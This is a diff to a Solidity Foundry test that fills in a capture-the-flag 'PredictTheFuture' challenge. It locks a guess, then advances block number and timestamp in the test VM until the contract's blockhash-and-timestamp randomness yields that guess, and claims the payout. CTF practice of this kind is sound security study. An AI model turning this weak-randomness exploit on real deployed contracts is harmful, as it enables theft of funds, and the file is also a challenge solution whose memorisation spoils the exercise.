@@ -16,9 +16,26 @@ contract PredictTheFutureTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        instance.setGuess{value: 0.01 ether}(0);
 
-        checkSuccess();
+        bool success = false;
+
+        for (uint256 i = 2; i <= 256; i++) {
+            vm.roll(block.number + i);
+            vm.warp(block.timestamp + i);
+
+            bytes32 hash = blockhash(block.number - 1);
+            uint256 answer = uint256(keccak256(abi.encodePacked(hash, block.timestamp))) % 10;
+
+            if (answer == 0) {
+                instance.solution();
+                success = true;
+                break;
+            }
+        }
+
+
+    checkSuccess();
     }
 
     function checkSuccess() internal view override {
